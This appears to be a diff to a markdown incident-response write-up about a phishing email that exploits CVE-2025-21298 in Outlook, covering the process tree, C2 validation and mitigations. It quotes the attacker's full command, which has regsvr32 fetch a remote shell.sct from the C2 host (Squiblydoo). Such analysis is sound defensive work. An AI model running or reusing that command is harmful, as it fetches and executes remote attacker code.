@@ -32,20 +32,31 @@ CVE-2025-21298 is a critical Remote Code Execution (RCE) vulnerability within th
 ### 1. Phishing Email & Sender Analysis
 The investigation began by reviewing the delivered email.
 - **Sender:** `projectmanagement@pm.me` (ProtonMail is frequently abused by threat actors due to its anonymity).
+
+<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/88c1616a-fe81-487e-bb79-7f0176e6e9b4" />
+
 - **Lure:** High-urgency project management deadline.
 - **Attachment Analysis:** The attached `mail.rtf` file hash was queried on VirusTotal. It returned a high malicious confidence score (29/61), with vendors specifically flagging it for CVE exploitation and execution capabilities.
+<img width="916" height="160" alt="image" src="https://github.com/user-attachments/assets/507d8fb1-2973-469e-b67b-ebb5fd72e3ee" />
 
 ### 2. Endpoint Execution Verification (Process Tree)
 To verify if the Zero-Click exploit triggered, the EDR logs for Austin's workstation were analyzed. 
 - **Process Tree Validation:** A highly anomalous process chain was identified: `OUTLOOK.EXE` spawned `cmd.exe` (PID 6784). This confirms the RTF preview pane exploit successfully broke out of the Outlook application.
+<img width="899" height="200" alt="image" src="https://github.com/user-attachments/assets/adec741c-1dba-4b74-9fa3-20cb8340eb66" />
 - **Command Line Execution:** The command shell immediately executed the following string:
   `"C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll"`
 
 ### 3. Command and Control (C2) Validation
 The execution string utilizes a "Living off the Land" technique known as **Squiblydoo**. It uses the native, trusted `regsvr32.exe` binary to fetch and execute a malicious scriptlet entirely in memory, bypassing AppLocker.
-- **Proxy Logs:** EDR Raw Logs captured `cmd.exe` successfully making an HTTP GET request to `http://84.38.130.118.com/shell.sct` (Device Action: Permitted).
+
+<img width="600" height="200" alt="image" src="https://github.com/user-attachments/assets/fa0a66ac-6877-4c65-b48e-6e01443e6b69" />
+<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/2ebcce11-4368-4c62-ab7f-f47322516376" />
+
+
+- **Proxy Logs:** EDR Raw Logs captured `cmd.exe` successfully making an HTTP GET request to `http://84.38[.]130.118.com/shell.sct` (Device Action: Permitted).
 - *(Analyst Note: The attacker made a syntax error in their payload, appending `.com` to an IPv4 address. However, the connection was still attempted).*
 - **Threat Intelligence:** The C2 IP address (`84.38.130.118`) is geographically located in Latvia and is flagged by 9/91 vendors on VirusTotal.
+<img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/960cfa2f-8ea5-4541-a5d8-2e98c6b162f1" />
 
 ### 4. Lateral Movement & Scope Assessment
 A comprehensive network search was conducted using the C2 IP address to identify if any other hosts communicated with the attacker infrastructure. Austin's outbox was also reviewed to ensure the malware was not propagating internally via reply-chain emails.
@@ -93,16 +104,6 @@ To improve automated detection of this attack chain, the following logic should 
 1. **Disable Outlook Preview Pane:** As a temporary mitigation against Zero-Click OLE vulnerabilities, disable the Outlook Preview Pane via Group Policy until all endpoints are patched against CVE-2025-21298.
 2. **ASR Rules:** Enable the Microsoft Defender Attack Surface Reduction (ASR) rule: *"Block all Office applications from creating child processes."*
 3. **Patch Management:** Deploy the latest cumulative Windows Security Updates to all endpoints to remediate the OLE parsing vulnerability.
-
-## Evidence / Screenshots
-
-<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/88c1616a-fe81-487e-bb79-7f0176e6e9b4" />
-<img width="916" height="160" alt="image" src="https://github.com/user-attachments/assets/507d8fb1-2973-469e-b67b-ebb5fd72e3ee" />
-<img width="899" height="200" alt="image" src="https://github.com/user-attachments/assets/adec741c-1dba-4b74-9fa3-20cb8340eb66" />
-<img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/960cfa2f-8ea5-4541-a5d8-2e98c6b162f1" />
-<img width="600" height="200" alt="image" src="https://github.com/user-attachments/assets/fa0a66ac-6877-4c65-b48e-6e01443e6b69" />
-<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/25573851-8213-4efa-81e2-db41a6ced491" />
-
 
 
 ## 🛠️ Skills & Tools Used
